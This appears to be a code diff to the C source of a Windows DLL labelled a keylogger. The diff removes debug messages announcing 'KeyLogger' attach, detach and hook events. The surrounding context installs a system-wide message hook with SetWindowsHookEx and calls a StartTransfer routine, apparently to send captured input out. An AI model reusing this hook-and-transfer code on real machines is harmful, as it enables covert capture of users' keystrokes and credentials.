@@ -21,8 +21,6 @@ WCHAR	CurrentDirectory[MAX_PATH + 1] = {0};
 
 BOOL	bKLExitAllReadConfigThread = FALSE;
 
-WCHAR g_szCurApp[MAX_PATH];
-
 #pragma data_seg()
 #pragma comment ( linker, "/SECTION:SharedSegment,RWS" )
 
@@ -32,12 +30,6 @@ BOOLEAN WINAPI DllMain( HINSTANCE hDllHandle, DWORD  nReason, LPVOID Reserved )
 	{
 	case DLL_PROCESS_ATTACH :
         {
-            if (GetModuleFileNameW(NULL, g_szCurApp, ARRAYSIZE(g_szCurApp)) > 0)
-            {
-                WCHAR szMsg[MAX_PATH];
-                swprintf_s(szMsg, L"KeyLogger: Attached to %s", g_szCurApp);
-                OutputDebugString(szMsg);
-            }
             InitializeCriticalSection(&csAppInit);
             InitializeCriticalSection(&csLinkList);
             break;
@@ -51,18 +43,11 @@ BOOLEAN WINAPI DllMain( HINSTANCE hDllHandle, DWORD  nReason, LPVOID Reserved )
 
 	case DLL_PROCESS_DETACH : // called when window closes
 		{
-            WCHAR szMsg[MAX_PATH];
-            swprintf_s(szMsg, L"KeyLogger: Detaching from %s", g_szCurApp);
-            OutputDebugString(szMsg);
-
 			bKLExitReadConfigThread = TRUE;
 			StartTransfer();
 
 			DeleteCriticalSection( &csLinkList );
 			DeleteCriticalSection( &csAppInit );
-
-            swprintf_s(szMsg, L"KeyLogger: Detached from %s", g_szCurApp);
-            OutputDebugString(szMsg);
 			break;
 		}
 	}
@@ -74,10 +59,6 @@ BOOLEAN WINAPI DllMain( HINSTANCE hDllHandle, DWORD  nReason, LPVOID Reserved )
 
 BOOL InstallKLHook( WCHAR *CPMDirectory )
 {
-    WCHAR szMsg[MAX_PATH];
-    swprintf_s(szMsg, L"KeyLogger: InstallKLHook in %s", g_szCurApp);
-    OutputDebugString(szMsg);
-
 	hWndHook = SetWindowsHookEx( WH_GETMESSAGE, (HOOKPROC)KLGetMsgProc, (HINSTANCE)hInstance, 0 );
 	if( hWndHook == NULL )
 		return FALSE;
@@ -90,10 +71,6 @@ BOOL InstallKLHook( WCHAR *CPMDirectory )
 
 BOOL RemoveKLHook()
 {
-    WCHAR szMsg[MAX_PATH];
-    swprintf_s(szMsg, L"KeyLogger: RemoveKLHook in %s", g_szCurApp);
-    OutputDebugString(szMsg);
-
 	bKLExitAllReadConfigThread = TRUE;
 
 	if( hWndHook )
